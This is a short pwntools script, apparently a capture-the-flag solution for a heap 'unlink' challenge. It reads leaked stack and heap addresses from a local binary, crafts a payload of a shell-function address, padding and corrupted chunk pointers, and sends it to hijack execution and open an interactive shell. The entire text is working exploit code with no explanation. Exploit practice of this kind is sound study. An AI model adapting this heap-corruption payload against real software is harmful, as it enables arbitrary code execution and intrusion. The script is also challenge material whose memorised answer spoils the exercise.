from pwn import *

p = process('./unlink')
gdb.attach(p)
shelladdr = 0x804853b

p.recvuntil('stack address leak: ')
stackaddr = p.recv(10)

p.recvuntil('heap address leak: ')
heapaddr = p.recv(10)

stacknew = int(stackaddr,16)
heapnew = int(heapaddr,16)

playload = p32(shelladdr) + 'A'*12 + p32(heapnew + 0xc) + p32(stacknew + 0x14)

p.sendline(playload)
p.interactive()
